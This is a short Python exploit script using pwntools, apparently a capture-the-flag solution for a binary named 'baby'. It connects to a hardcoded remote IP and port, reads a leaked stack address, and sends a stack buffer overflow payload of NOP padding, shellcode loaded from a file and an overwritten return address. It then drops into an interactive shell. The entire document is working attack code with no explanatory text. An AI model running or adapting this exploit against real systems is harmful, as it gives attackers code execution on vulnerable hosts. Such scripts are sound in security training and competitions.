from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

s = remote('142.93.113.134', 9999)
# s = process('./baby')
# s = gdb.debug('./baby','b main')

with open('shellcode_short.sc','rb') as f:
    shellcode = f.read(0x23)

s.recvuntil('stack? ')
address = int(s.recvline().decode().strip(),16)

buf = b''
buf += b'\x90'*4
buf += shellcode
buf += b'\x90'*(136-len(buf))
buf += p64(address)

s.sendline(buf)
s.interactive()
